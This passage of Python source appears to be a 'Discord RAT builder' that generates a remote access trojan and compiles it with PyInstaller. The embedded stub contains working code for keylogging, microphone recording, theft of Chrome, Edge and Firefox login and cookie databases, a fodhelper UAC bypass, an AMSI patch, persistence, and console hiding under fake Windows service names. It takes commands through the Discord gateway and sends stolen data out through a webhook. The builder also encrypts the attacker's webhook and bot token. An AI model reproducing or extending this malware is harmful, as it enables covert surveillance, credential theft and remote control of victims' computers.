        hdr.lpData = ctypes.addressof(buf)
        hdr.dwBufferLength = buf_size
        winmm.waveInPrepareHeader(hwi, ctypes.byref(hdr), ctypes.sizeof(hdr))
        winmm.waveInAddBuffer(hwi, ctypes.byref(hdr), ctypes.sizeof(hdr))
        winmm.waveInStart(hwi)
        time.sleep(duration)
        winmm.waveInStop(hwi)
        winmm.waveInUnprepareHeader(hwi, ctypes.byref(hdr), ctypes.sizeof(hdr))
        winmm.waveInClose(hwi)
        recorded = hdr.dwBytesRecorded
        if recorded > 1000:
            with open(tmp, "wb") as f:
                f.write(b"RIFF")
                f.write(struct.pack("<I", 36 + recorded))
                f.write(b"WAVEfmt ")
                f.write(struct.pack("<IHHIIHH", 16, 1, 1, 22050, 44100, 2, 16))
                f.write(b"data")
                f.write(struct.pack("<I", recorded))
                f.write(buf.raw[:recorded])
            with open(tmp, "rb") as f:
                data = f.read()
            os.remove(tmp)
            return data
    except Exception as e:
        dprint(f"Audio error: {{e}}")
    return None

def keylog_start():
    global KEYLOG_ACTIVE, KEYLOG_DATA
    if KEYLOG_ACTIVE:
        return "Keylogger already running"
    KEYLOG_ACTIVE = True
    KEYLOG_DATA = []
    def _keylog_thread():
        try:
            user32 = ctypes.windll.user32
            last_vk = 0
            buffer = []
            while KEYLOG_ACTIVE:
                for vk in range(256):
                    if user32.GetAsyncKeyState(vk) & 0x0001:
                        if vk == last_vk:
                            continue
                        last_vk = vk
                        shift = user32.GetAsyncKeyState(0x10) & 0x8000
                        caps = user32.GetKeyState(0x14) & 0x0001
                        key = ""
                        if 48 <= vk <= 57:
                            key = chr(vk) if not shift else "!@#$%^&*()"[vk-48]
                        elif 65 <= vk <= 90:
                            key = chr(vk + 32)
                            if shift ^ caps:
                                key = key.upper()
                        elif vk == 13: key = "[ENTER]\\n"
                        elif vk == 32: key = " "
                        elif vk == 9: key = "[TAB]"
                        elif vk == 8: key = "[BS]"
                        elif vk == 46: key = "[DEL]"
                        elif vk == 27: key = "[ESC]"
                        elif vk == 192: key = "~" if shift else "`"
                        elif 96 <= vk <= 105: key = str(vk - 96)
                        elif 106 <= vk <= 111: key = "*/-+."[vk-106]
                        if key:
                            buffer.append(key)
                        if len(buffer) >= 50:
                            with DBG_LOCK:
                                KEYLOG_DATA.append("".join(buffer))
                            buffer = []
                        time.sleep(0.01)
                time.sleep(0.05)
            if buffer:
                with DBG_LOCK:
                    KEYLOG_DATA.append("".join(buffer))
        except Exception as e:
            dprint(f"Keylog error: {{e}}")
    t = threading.Thread(target=_keylog_thread, daemon=True)
    t.start()
    return "Keylogger started"

def keylog_stop():
    global KEYLOG_ACTIVE
    KEYLOG_ACTIVE = False
    time.sleep(0.5)
    with DBG_LOCK:
        log = "".join(KEYLOG_DATA)
        KEYLOG_DATA = []
    if log:
        if len(log) > 1900:
            for i in range(0, len(log), 1900):
                send_webhook(f"```\nKEYLOG {{i//1900+1}}:\n{{log[i:i+1900]}}\n```")
        else:
            send_webhook(f"```\nKEYLOG:\n{{log}}\n```")
        return f"Keylogger stopped, {{len(log)}} chars sent"
    return "Keylogger stopped, no keystrokes"

def steal_browser():
    try:
        results = []
        local = os.getenv("LOCALAPPDATA", "")
        roaming = os.getenv("APPDATA", "")
        chrome_path = os.path.join(local, "Google", "Chrome", "User Data")
        edge_path = os.path.join(local, "Microsoft", "Edge", "User Data")
        firefox_path = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
        for name, bpath in [("Chrome", chrome_path), ("Edge", edge_path)]:
            if os.path.isdir(bpath):
                results.append(f"{{name}} found")
                for f in os.listdir(bpath):
                    if f.startswith("Default") or f.startswith("Profile"):
                        for db in ["Login Data", "Cookies", "History"]:
                            src = os.path.join(bpath, f, db)
                            if os.path.isfile(src):
                                dst = os.path.join(os.getenv("TEMP", "."), f"{{name.lower()}}_{{f}}_{{db}}.db")
                                try:
                                    shutil.copy2(src, dst)
                                    with open(dst, 'rb') as fh:
                                        send_file(f"{{name.lower()}}_{{f}}_{{db}}.db", fh.read(), CMDS_CHANNEL)
                                    os.remove(dst)
                                except: pass
        if os.path.isdir(firefox_path):
            results.append("Firefox found")
            for prof in os.listdir(firefox_path):
                prof_dir = os.path.join(firefox_path, prof)
                if os.path.isdir(prof_dir):
                    for db in ["logins.json", "cookies.sqlite", "places.sqlite"]:
                        src = os.path.join(prof_dir, db)
                        if os.path.isfile(src):
                            dst = os.path.join(os.getenv("TEMP", "."), f"ff_{{prof}}_{{db}}")
                            try:
                                shutil.copy2(src, dst)
                                with open(dst, 'rb') as fh:
                                    send_file(f"ff_{{prof}}_{{db}}", fh.read(), CMDS_CHANNEL)
                                os.remove(dst)
                            except: pass
        return "\\n".join(results) if results else "No browsers found"
    except Exception as e:
        return f"Browser steal error: {{e}}"

def uac_bypass():
    try:
        exe = os.path.abspath(sys.argv[0])
        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\fodhelper.exe"
        try:
            k = ctypes.windll.advapi32.RegCreateKeyExW(
                ctypes.windll.user32.HKEY_CURRENT_USER, reg_path, 0, None, 0, 0x20006, None,
                ctypes.byref(ctypes.c_void_p()), None)
            if k:
                ctypes.windll.advapi32.RegSetValueExW(k, "Debugger", 0, 1, exe, len(exe)*2)
                ctypes.windll.advapi32.RegCloseKey(k)
        except: pass
        subprocess.Popen(["fodhelper.exe"], creationflags=0x08000000)
        time.sleep(3)
        try:
            k = ctypes.windll.advapi32.RegOpenKeyExW(
                ctypes.windll.user32.HKEY_CURRENT_USER, reg_path, 0, 0x20006, ctypes.byref(ctypes.c_void_p()))
            if k:
                ctypes.windll.advapi32.RegDeleteValueW(k, "Debugger")
                ctypes.windll.advapi32.RegCloseKey(k)
        except: pass
        try:
            ctypes.windll.advapi32.RegDeleteKeyW(ctypes.windll.user32.HKEY_CURRENT_USER, reg_path)
        except: pass
        return "UAC bypass attempted (fodhelper)"
    except Exception as e:
        return f"UAC bypass error: {{e}}"

def amsi_bypass():
    try:
        k32 = ctypes.windll.kernel32
        h = k32.GetModuleHandleW("amsi.dll")
        if not h:
            return "amsi.dll not loaded"
        addr = k32.GetProcAddress(h, b"AmsiScanBuffer")
        if not addr:
            return "AmsiScanBuffer not found"
        old = ctypes.c_ulong(0)
        k32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xc3", 1)
        k32.VirtualProtect(addr, 1, old.value, ctypes.byref(old))
        return "AMSI bypassed (AmsiScanBuffer patched)"
    except Exception as e:
        return f"AMSI error: {{e}}"

def handle_command(cmd_text):
    parts = cmd_text.strip().split(" ", 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""
    dprint(f"Command: {{cmd}} args={{args[:30]}}")

    if cmd == "info":
        info = get_info()
        return "\n".join(f"{{k}}: {{v}}" for k, v in info.items())
    elif cmd == "shell":
        return run_command(args if args else "whoami")
    elif cmd == "cd":
        if args:
            try:
                os.chdir(args)
                return f"Changed to: {{os.getcwd()}}"
            except Exception as e:
                return str(e)
        return os.getcwd()
    elif cmd == "ls":
        return list_files(args if args else os.getcwd())
    elif cmd == "screenshot":
        data = take_screenshot()
        if data:
            send_file("screenshot.bmp", data, CMDS_CHANNEL)
            return "Screenshot sent via webhook"
        return "Screenshot failed"
    elif cmd == "clipboard":
        return get_clipboard()
    elif cmd == "setclip":
        if args:
            try:
                if _set_clipboard(args):
                    return f"Clipboard set to: {{args[:50]}}"
                return "Failed to set clipboard"
            except: return "Failed to set clipboard"
        return "Usage: setclip <text>"
    elif cmd == "wifi":
        return get_wifi()
    elif cmd == "processes":
        try:
            r = subprocess.run("tasklist /FO CSV /NH", shell=True, capture_output=True, text=True, timeout=10)
            lines = [l.strip() for l in r.stdout.strip().split('\n') if l.strip()]
            procs = []
            for line in lines[:30]:
                parts2 = line.replace('"', '').split(',')
                if len(parts2) >= 5:
                    procs.append(f"  {{parts2[0]:30}} PID={{parts2[1]:>8}} Mem={{parts2[4]:>12}}")
            return "\n".join(procs) if procs else "(no processes)"
        except Exception as e:
            return f"Error: {{e}}"
    elif cmd == "killproc":
        if args:
            return run_command(f"taskkill /F /IM {{args}}")
        return "Usage: killproc <process_name.exe>"
    elif cmd == "sysinfo":
        try:
            info_items = []
            info_items.append(f"User: {{os.getenv('USERNAME', '?')}}@{{platform.node()}}")
            info_items.append(f"OS: {{platform.platform()}}")
            info_items.append(f"Python: {{platform.python_version()}}")
            info_items.append(f"Arch: {{platform.machine()}}")
            info_items.append(f"CPU: {{platform.processor() or 'N/A'}}")
            try:
                k32 = ctypes.windll.kernel32
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                                ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                                ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                                ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
                mem = MEMORYSTATUSEX()
                mem.dwLength = ctypes.sizeof(mem)
                k32.GlobalMemoryStatusEx(ctypes.byref(mem))
                info_items.append(f"Free RAM: {{mem.ullAvailPhys / (1024**3):.1f}} GB")
                info_items.append(f"Total RAM: {{mem.ullTotalPhys / (1024**3):.1f}} GB")
            except: pass
            try:
                free = ctypes.c_ulonglong(0)
                total = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW("C:\\\\", None, ctypes.byref(total), ctypes.byref(free))
                info_items.append(f"  C: {{free.value / (1024**3):.1f}}GB free / {{total.value / (1024**3):.1f}}GB")
            except: pass
            info_items.append(f"CWD: {{os.getcwd()}}")
            return "\\n".join(info_items)
        except Exception as e:
            return f"Error: {{e}}"
    elif cmd == "download":
        if os.path.isfile(args):
            with open(args, 'rb') as f:
                send_file(os.path.basename(args), f.read(), CMDS_CHANNEL)
            return f"Sent: {{args}}"
        return f"File not found: {{args}}"
    elif cmd == "upload":
        return "Use webhook to send files (receives via last message)"
    elif cmd == "webcam":
        data = webcam_capture()
        if data:
            send_file("webcam.jpg", data, CMDS_CHANNEL)
            return "Webcam capture sent via webhook"
        return "Webcam capture failed (no camera or driver issue)"
    elif cmd == "audio":
        dur = int(args) if args.isdigit() else 5
        if dur < 1: dur = 1
        if dur > 30: dur = 30
        data = audio_record(dur)
        if data:
            send_file("audio.wav", data, CMDS_CHANNEL)
            return f"Audio {{dur}}s recorded and sent via webhook"
        return "Audio recording failed (no mic or driver issue)"
    elif cmd == "keylog":
        return keylog_start()
    elif cmd == "keylog_stop":
        return keylog_stop()
    elif cmd == "steal_browser":
        return steal_browser()
    elif cmd == "uac":
        return uac_bypass()
    elif cmd == "amsi":
        return amsi_bypass()
    elif cmd == "persist":
        persist()
        return "Persistence attempt done"
    elif cmd == "kill":
        send_webhook("[RAT] Self-terminating")
        os._exit(0)
    elif cmd == "help":
        return """Commands:
  info          - System info
  sysinfo       - Detailed system info (RAM, disks)
  shell <cmd>   - Run command
  cd <path>     - Change directory
  ls [path]     - List files
  screenshot    - Take screenshot (sent via webhook)
  clipboard     - Get clipboard content
  setclip <txt> - Set clipboard content
  wifi          - Show saved WiFi passwords
  processes     - List running processes
  killproc <p>  - Kill process by name
  download <f>  - Send file via webhook
  webcam        - Capture webcam image
  audio [sec]   - Record audio (1-30s, default 5)
  keylog        - Start keylogger (sends via webhook)
  keylog_stop   - Stop keylogger and dump logs
  steal_browser - Steal Chrome/Edge/Firefox DBs
  uac           - Attempt UAC bypass (fodhelper)
  amsi          - Bypass AMSI for current session
  persist       - Install persistence (triple-method)
  kill          - Terminate RAT
  help          - This help"""
    else:
        return f"Unknown command: {{cmd}} (try 'help')"

GATEWAY_URL = "gateway.discord.gg"
GATEWAY_PATH = "/?v=10&encoding=json"
INTENTS = (1 << 0) | (1 << 9) | (1 << 15)

def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def _ws_connect(host, path):
    ctx = ssl.create_default_context()
    raw = socket.create_connection((host, 443), timeout=15)
    s = ctx.wrap_socket(raw, server_hostname=host)
    key = base64.b64encode(os.urandom(16)).decode()
    req = "GET {{}} HTTP/1.1\r\nHost: {{}}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {{}}\r\nSec-WebSocket-Version: 13\r\n\r\n".format(path, host, key)
    s.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            s.close()
            raise Exception("No response from gateway")
        resp += chunk
    if b"101" not in resp.split(b"\r\n")[0]:
        s.close()
        raise Exception("WebSocket upgrade failed")
    return s

def _ws_send(sock, payload, opcode=0x1):
    data = payload.encode() if isinstance(payload, str) else payload
    frame = bytearray([0x80 | opcode])
    mask = os.urandom(4)
    n = len(data)
    if n < 126:
        frame.append(0x80 | n)
    elif n < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack('>H', n))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack('>Q', n))
    frame.extend(mask)
    for i in range(n):
        frame.append(data[i] ^ mask[i % 4])
    sock.sendall(bytes(frame))

def _ws_recv(sock):
    hdr = _recv_exact(sock, 2)
    if not hdr:
        return None, None
    opcode = hdr[0] & 0x0F
    length = hdr[1] & 0x7F
    if length == 126:
        ext = _recv_exact(sock, 2)
        if not ext: return None, None
        length = struct.unpack('>H', ext)[0]
    elif length == 127:
        ext = _recv_exact(sock, 8)
        if not ext: return None, None
        length = struct.unpack('>Q', ext)[0]
    payload = _recv_exact(sock, length) or b""
    if opcode == 0x9:
        _ws_send(sock, payload, 0xA)
    return opcode, payload

def main():
    dprint("=== RAT STARTING ===")
    dprint(f"Webhook: {{WEBHOOK[:30]}}...")
    dprint(f"Sleep: {{SLEEP}}s | Prefix: {{PREFIX}} | Persist: {{PERSIST}} | Debug: {{DEBUG}}")

    if STEALTH and anti_vm():
        dprint("VM detected - short delay then continuing")
        time.sleep(5)
    if STEALTH and anti_debug():
        dprint("Debugger detected - continuing anyway")

    persist()
    if STEALTH:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            dprint("Console hidden")
        except: pass
        try:
            titles = ["Windows Security Service", "Runtime Broker", "Service Host", "SearchIndexer"]
            ctypes.windll.kernel32.SetConsoleTitleW(random.choice(titles))
            dprint("Window title randomized")
        except: pass

    info = get_info()
    pc = get_pc_id()

    has_commands = bool(TOKEN and GUILD)
    if not has_commands:
        dprint("No token/guild provided - webhook beacon only")
        send_webhook(f"[RAT CONNECTED] {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
        while True:
            jitter = random.uniform(SLEEP * 0.8, SLEEP * 1.2)
            time.sleep(jitter)

    seq = 0
    heartbeat_interval = 40.0
    last_msg_id = None
    connected = False
    reconnect_delay = 5
    channels_ready = False

    while True:
        sock = None
        try:
            dprint("Connecting to Discord Gateway...")
            sock = _ws_connect(GATEWAY_URL, GATEWAY_PATH)
            dprint("TCP+TLS+WS connected")

            opcode, payload = _ws_recv(sock)
            if opcode is None:
                raise Exception("Connection closed before HELLO")
            hello = json.loads(payload.decode())
            if hello.get("op") != 10:
                raise Exception(f"Expected HELLO op 10, got op {{hello.get('op')}}")
            heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000.0
            dprint(f"Heartbeat interval: {{heartbeat_interval:.0f}}ms")
            reconnect_delay = 5

            identify = {{
                "op": 2,
                "d": {{
                    "token": "Bot " + TOKEN,
                    "intents": INTENTS,
                    "properties": {{
                        "os": "windows",
                        "browser": "chrome",
                        "device": "",
                        "system_locale": "en-US"
                    }}
                }}
            }}
            _ws_send(sock, json.dumps(identify))
            dprint("IDENTIFY sent")
            sock.settimeout(heartbeat_interval)

            last_hb = time.time()
            connected = True

            if not channels_ready:
                if setup_channels():
                    channels_ready = True
                    send_webhook(f"[RAT ONLINE] {{pc}} | {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
                    discord_api("POST", f"/channels/{{STATUS_CHANNEL}}/messages", {{"content": f"[BEACON] {{pc}} online | {{info['user']}}@{{info['computer']}} | {{info['os']}}"}})
                else:
                    dprint("Channel setup failed - will retry next cycle")

            while True:
                try:
                    opcode, payload = _ws_recv(sock)
                except socket.timeout:
                    elapsed = time.time() - last_hb
                    if elapsed >= heartbeat_interval - 1:
                        try:
                            _ws_send(sock, json.dumps({{"op": 1, "d": seq}}))
                            last_hb = time.time()
                            if CMDS_CHANNEL:
                                try:
                                    discord_api("POST", f"/channels/{{STATUS_CHANNEL}}/messages", {{"content": f"[BEACON] {{pc}} alive"}})
                                except: pass
                        except Exception as e:
                            dprint(f"Heartbeat send failed: {{e}}")
                            break
                    sock.settimeout(max(1, heartbeat_interval - (time.time() - last_hb)))
                    continue

                if opcode is None:
                    dprint("Connection closed by gateway")
                    break
                if opcode == 0x9:
                    continue
                if opcode == 0x8:
                    dprint("Gateway sent close frame")
                    break

                try:
                    data = json.loads(payload.decode())
                except:
                    continue

                op = data.get("op", -1)

                if op == 0:
                    seq = data.get("s", seq) or seq
                    t = data.get("t", "")
                    if t == "READY":
                        user = data.get("d", {{}}).get("user", {{}})
                        dprint(f"READY as {{user.get('username', '?')}}#{{user.get('discriminator', '0')}}")
                    elif t == "MESSAGE_CREATE":
                        msg = data.get("d", {{}})
                        ch_id = str(msg.get("channel_id", ""))
                        if CMDS_CHANNEL and ch_id == CMDS_CHANNEL:
                            content = msg.get("content", "")
                            author = msg.get("author", {{}})
                            if author.get("bot"):
                                continue
                            if content.startswith(PREFIX):
                                cmd = content[len(PREFIX):].strip()
                                if cmd:
                                    dprint(f"CMD from {{author.get('username','?')}}: {{cmd}}")
                                    result = handle_command(cmd)
                                    resp = f"```\\n{{result}}\\n```"
                                    dprint(f"Response {{len(resp)}} chars, webhook={{bool(CMDS_WEBHOOK)}}")
                                    if CMDS_WEBHOOK:
                                        try:
                                            data = {{"content": resp[:2000]}}
                                            body = json.dumps(data).encode("utf-8")
                                            req = urllib.request.Request(CMDS_WEBHOOK, data=body, headers={{"Content-Type": "application/json"}}, method="POST")
                                            resp_http = urllib.request.urlopen(req, timeout=10)
                                            dprint(f"Response sent {{resp_http.status}}")
                                        except Exception as e:
                                            dprint(f"Webhook send failed: {{e}}, falling back to bot")
                                            discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": resp[:2000]}})
                                    else:
                                        dprint("No webhook, using bot token")
                                        discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": resp[:2000]}})
                            elif content:
                                dprint(f"MSG (no prefix): {{content[:60]}}")
                elif op == 7:
                    dprint("Reconnect requested")
                    break
                elif op == 9:
                    dprint("Invalid session - reconnecting in 5s")
                    time.sleep(5)
                    break
                elif op == 11:
                    pass

        except Exception as e:
            dprint(f"Gateway error: {{e}}")
        finally:
            connected = False
            if sock:
                try: sock.close()
                except: pass

        jitter = random.uniform(0.5, 1.5)
        delay = reconnect_delay * jitter
        dprint(f"Reconnecting in {{delay:.1f}}s...")
        time.sleep(delay)
        reconnect_delay = min(reconnect_delay * 1.5, 60)

if __name__ == "__main__":
    main()
'''

def _debug_print(title, msg):
    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")

def run(kevbin=None):
    debug_mode = False
    while True:
        clear()
        dbg = " \033[91m[DEBUG]\033[0m" if debug_mode else ""
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       DISCORD RAT BUILDER{dbg}" + " "*(27-len(dbg)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Build RAT (.py)\033[0m")
        cprint("  \033[97m[2]  Build RAT (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[97m[4]  Command Reference\033[0m")
        cprint("  \033[97m[5]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '5':
            debug_mode = not debug_mode
            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
            cprint(f"  Debug: {state}")
            time.sleep(0.5)
            continue
        elif choice == '4':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  RAT COMMAND REFERENCE\033[0m")
            cprint("  \033[93m\u2550"*54)
            cmds = [
                ("info", "System info (user, PC, OS, IP)"),
                ("sysinfo", "Detailed system info (RAM, disks)"),
                ("shell <cmd>", "Run shell command"),
                ("cd <path>", "Change directory"),
                ("ls [path]", "List directory contents"),
                ("screenshot", "Capture screen (sent via webhook)"),
                ("clipboard", "Get clipboard content"),
                ("setclip <txt>", "Set clipboard content"),
                ("wifi", "Show saved WiFi passwords"),
                ("processes", "List running processes"),
                ("killproc <name>", "Kill process by name"),
                ("download <file>", "Send file via webhook"),
                ("webcam", "Capture webcam image"),
                ("audio [sec]", "Record audio (1-30s, default 5)"),
                ("keylog", "Start keylogger (webhook exfil)"),
                ("keylog_stop", "Stop keylogger and dump logs"),
                ("steal_browser", "Steal Chrome/Edge/Firefox DBs"),
                ("uac", "Attempt UAC bypass (fodhelper)"),
                ("amsi", "Bypass AMSI for current session"),
                ("persist", "Install persistence (triple-method)"),
                ("kill", "Terminate RAT"),
            ]
            for name, desc in cmds:
                cprint(f"  \033[96m{name:20}\033[0m {desc}")
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  RAT CONFIGURATION\033[0m")
            cprint("  \033[93m\u2550"*54)
            print()
            webhook = prompt("  \033[96mWebhook URL: \033[0m").strip()
            if not webhook or 'discord' not in webhook:
                cprint("  \033[91m[X] Need valid webhook URL\033[0m"); pause(); continue
            token = prompt("  \033[96mBot Token (for commands): \033[0m").strip()
            guild = prompt("  \033[96mGuild/Server ID (bot creates its own channels): \033[0m").strip()
            if not token or not guild:
                cprint("  \033[93m[!] No token/guild — beacon-only mode (no remote commands)\033[0m")
            if debug_mode:
                _debug_print("WEBHOOK", webhook[:40] + "...")
                _debug_print("TOKEN", token[:10] + "..." if token else "NONE")
                _debug_print("GUILD", guild or "NONE")
            print()
            persist_opt = prompt("  \033[96mEnable persistence? (y/n, default n): \033[0m").strip().lower() == 'y'
            stealth = prompt("  \033[96mHide console? (y/n, default y): \033[0m").strip().lower() != 'n'
            try:
                sleep_sec = int(prompt("  \033[96mBeacon interval seconds (default 5): \033[0m").strip() or '5')
            except: sleep_sec = 5
            sleep_sec = max(2, sleep_sec)
            prefix = prompt("  \033[96mCommand prefix (default !): \033[0m").strip() or "!"
            print()
            cprint("  \033[93m  Advanced Options:\033[0m")
            icon_path = prompt("  \033[96mCustom .ico icon (Enter to skip): \033[0m").strip()
            if icon_path and not os.path.isfile(icon_path):
                cprint("  \033[93m[!] Icon not found, using default\033[0m")
                icon_path = ""
            persist_name = prompt("  \033[96mPersistence filename (default: csrss): \033[0m").strip() or "csrss"
            out_dir = prompt("  \033[96mOutput directory (Enter = current): \033[0m").strip()
            if out_dir and not os.path.isdir(out_dir):
                try:
                    os.makedirs(out_dir, exist_ok=True)
                    cprint(f"  \033[92m[*] Created: {out_dir}\033[0m")
                except:
                    cprint("  \033[93m[!] Cannot create dir, using current\033[0m")
                    out_dir = ""
            if debug_mode:
                _debug_print("CONFIG", f"Persist={persist_opt} Stealth={stealth} Sleep={sleep_sec}s Prefix={prefix}")
            import os as _os, base64 as _b64
            k1 = _os.urandom(16).hex()
            k2 = _os.urandom(16).hex()
            k3 = _os.urandom(16).hex()
            def _enc(val, key1, key2, key3):
                data = val.encode() if isinstance(val, str) else val
                kb1, kb2, kb3 = key1.encode(), key2.encode(), key3.encode()
                s1 = bytes(b ^ kb1[i % len(kb1)] for i, b in enumerate(data))
                s2 = bytes(b ^ kb2[i % len(kb2)] for i, b in enumerate(s1))
                s3 = s2[::-1]
                s4 = bytes(b ^ kb3[i % len(kb3)] for i, b in enumerate(s3))
                return _b64.b64encode(s4).decode()
            stub = RAT_STUB.format(
                webhook_enc=_enc(webhook, k1, k2, k3),
                token_enc=_enc(token or "", k1, k2, k3),
                guild_enc=_enc(guild or "", k1, k2, k3),
                dec_key=k1, dec_key2=k2, dec_key3=k3,
                persist=str(persist_opt),
                stealth=str(stealth),
                debug=str(debug_mode),
                sleep=sleep_sec,
                prefix=prefix,
                PERSIST_NAME=persist_name
            )
            out = prompt("  \033[96mOutput filename (default: rat.py): \033[0m").strip() or "rat.py"
            if not out.endswith('.py'): out += '.py'
            if out_dir:
                out = os.path.join(out_dir, out)
            if debug_mode:
                _debug_print("STUB", f"Length: {len(stub)} bytes")
            with open(out, 'w', encoding='utf-8') as f:
                f.write(stub)
            fsize = os.path.getsize(out)
            cprint(f"  \033[92m[X] Saved: {out} ({fsize} bytes)\033[0m")
            if debug_mode:
                _debug_print("FILE", f"Path: {os.path.abspath(out)}")
            if choice == '2':
                exe_name = os.path.splitext(out)[0] + ".exe"
                if debug_mode:
                    _debug_print("BUILD", f"Target: {os.path.join(out_dir if out_dir else 'dist', exe_name)}")
                    _debug_print("BUILD", f"Python: {sys.executable}")
                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                try:
                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
                           '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
                    if icon_path and os.path.isfile(icon_path):
                        cmd.extend(['--icon', icon_path])
                    if out_dir:
                        cmd.extend(['--distpath', out_dir])
                    if debug_mode:
                        _debug_print("CMD", " ".join(cmd))
                    result = subprocess.run(cmd, check=True, timeout=180,
                                           capture_output=debug_mode, text=debug_mode)
                    if debug_mode and result.stdout:
                        for line in result.stdout.strip().split('\n')[-8:]:
                            _debug_print("PYINST", line.strip())
                    dist_path = os.path.join(out_dir if out_dir else "dist", exe_name)
                    if os.path.isfile(dist_path):
                        esize = os.path.getsize(dist_path)
                        cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
                        if debug_mode:
                            _debug_print("DONE", f"Full: {os.path.abspath(dist_path)}")
                    else:
                        cprint(f"  \033[93m[?] Compiled but {dist_path} not found\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
                except subprocess.TimeoutExpired:
                    cprint("  \033[91m[X] Build timed out (180s)\033[0m")
                except subprocess.CalledProcessError as e:
                    cprint(f"  \033[91m[X] Build failed: exit code {e.returncode}\033[0m")
                    if debug_mode and e.stderr:
                        for line in str(e.stderr).strip().split('\n')[-6:]:
                            _debug_print("ERR", line.strip())
                except Exception as e:
                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
                    if debug_mode:
                        _debug_print("EXC", str(e))
        elif choice == '3':
            clear()
            stub = RAT_STUB.format(webhook_enc="ENCODED_WEBHOOK", token_enc="ENCODED_TOKEN",
                                    guild_enc="ENCODED_GUILD", dec_key="K1", dec_key2="K2", dec_key3="K3",
                                    persist="False", stealth="True",
                                    debug="False", sleep="5", prefix="!")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
